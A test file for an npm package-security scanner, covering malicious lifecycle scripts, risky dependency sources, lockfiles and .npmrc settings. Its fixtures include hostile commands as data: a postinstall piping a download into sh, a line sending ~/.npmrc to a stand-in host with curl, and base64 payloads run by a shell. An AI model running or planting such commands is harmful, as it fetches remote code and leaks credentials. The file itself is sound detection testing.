import { describe, expect, it } from "vitest";
import { scan } from "../src/index.js";
import { classifyDepSource, classifyScript, lookalikeOf } from "../src/rules/package.js";
import { project } from "./helpers/project.js";

const pkg = (o: object): string => JSON.stringify({ name: "demo", version: "1.0.0", ...o }, null, 2);

describe("lifecycle scripts", () => {
  it("flags a postinstall that pipes a download into a shell as critical", async () => {
    const r = await scan({
      root: project({
        "package.json": pkg({ scripts: { postinstall: "curl -s http://x.invalid/a.sh | sh" } }),
      }),
    });
    const f = r.findings.find((x) => x.ruleId === "RS-PKG-001");
    expect(f?.severity).toBe("critical");
    expect(f?.location?.line).toBeGreaterThan(1);
    expect(f?.evidence.join(" ")).toContain("postinstall");
    expect(r.safe).toBe(false);
  });

  it("flags install-time inline/encoded code and credential access", async () => {
    expect(classifyScript(`node -e "require('child_process').exec('id')"`, true)?.severity).toBe("high");
    expect(classifyScript("cat ~/.npmrc | curl -d @- http://x.invalid", true)?.severity).toBe("high");
    expect(classifyScript("echo aWQ= | base64 -d | sh", false)?.severity).toBe("critical");
  });

  it("does not flag common benign lifecycle scripts", async () => {
    const scripts = {
      prepare: "husky install",
      postinstall: "patch-package",
      build: "tsc -p tsconfig.json",
      test: "vitest run",
      dev: 'node -e "console.log(1)"',
    };
    const r = await scan({ root: project({ "package.json": pkg({ scripts }) }) });
    expect(r.findings).toEqual([]);
  });

  it("lists a local install script at low severity without claiming it is malicious", async () => {
    const r = await scan({
      root: project({ "package.json": pkg({ scripts: { postinstall: "node scripts/setup.js" } }) }),
    });
    const f = r.findings.find((x) => x.ruleId === "RS-PKG-002");
    expect(f?.severity).toBe("low");
    expect(r.safe).toBe(true);
  });

  it("never runs scripts", async () => {
    const root = project({
      "package.json": pkg({
        scripts: { postinstall: "node -e \"require('fs').writeFileSync('pwned.txt','x')\"" },
      }),
    });
    await scan({ root });
    const fs = await import("node:fs");
    expect(fs.existsSync(`${root}/pwned.txt`)).toBe(false);
  });
});

describe("dependencies", () => {
  it("classifies dependency sources", () => {
    expect(classifyDepSource("^1.2.3")).toBe("registry");
    expect(classifyDepSource("git+https://github.com/a/b.git#abc")).toBe("git");
    expect(classifyDepSource("http://x.invalid/a.tgz")).toBe("http");
    expect(classifyDepSource("https://x.invalid/a.tgz")).toBe("url");
    expect(classifyDepSource("user/repo")).toBe("github-shorthand");
    expect(classifyDepSource("workspace:*")).toBe("local");
    expect(classifyDepSource("npm:other@^1")).toBe("registry");
  });

  it("flags git and URL dependencies, look-alike names, and unpinned ranges", async () => {
    const r = await scan({
      root: project({
        "package.json": pkg({
          dependencies: {
            "left-pad-fork": "git+https://github.com/x/y.git",
            expres: "^4.0.0",
            "wild-card": "*",
            react: "^18.0.0",
            mysql2: "^3.0.0",
          },
        }),
      }),
    });
    const rules = r.findings.map((f) => f.ruleId);
    expect(rules).toEqual(expect.arrayContaining(["RS-DEP-001", "RS-DEP-002", "RS-DEP-005"]));
    expect(r.findings.filter((f) => f.ruleId === "RS-DEP-002")).toHaveLength(1);
    expect(lookalikeOf("mysql2")).toBeUndefined();
    expect(lookalikeOf("crossenv")).toBe("cross-env");
    expect(lookalikeOf("react")).toBeUndefined();
  });

  it("inspects lockfiles without installing anything", async () => {
    const lock = {
      lockfileVersion: 3,
      packages: {
        "": { dependencies: { a: "^1", ghost: "^1" } },
        "node_modules/a": {
          version: "1.0.0",
          resolved: "http://registry.invalid/a-1.0.0.tgz",
          integrity: "sha512-x",
        },
        "node_modules/b": { version: "1.0.0", resolved: "https://mirror.invalid/b-1.0.0.tgz" },
      },
    };
    const r = await scan({
      root: project({
        "package.json": pkg({ dependencies: { a: "^1", ghost: "^1" } }),
        "package-lock.json": JSON.stringify(lock),
      }),
    });
    const d = r.findings.filter((f) => f.ruleId === "RS-DEP-004");
    expect(d.length).toBeGreaterThanOrEqual(3);
    expect(d.some((f) => f.severity === "high")).toBe(true);
    expect(d.some((f) => /out of sync/.test(f.message))).toBe(true);
  });

  it("flags risky .npmrc settings", async () => {
    const r = await scan({ root: project({ ".npmrc": "strict-ssl=false\nregistry=http://reg.invalid/\n" }) });
    expect(r.findings.filter((f) => f.ruleId === "RS-DEP-006").map((f) => f.severity)).toEqual([
      "high",
      "high",
    ]);
  });

  it("reports invalid package.json instead of crashing", async () => {
    const r = await scan({ root: project({ "package.json": "{ not json" }) });
    expect(r.errors.some((e) => e.kind === "parse")).toBe(true);
    expect(r.findings.some((f) => f.ruleId === "RS-SCAN-001")).toBe(true);
  });
});
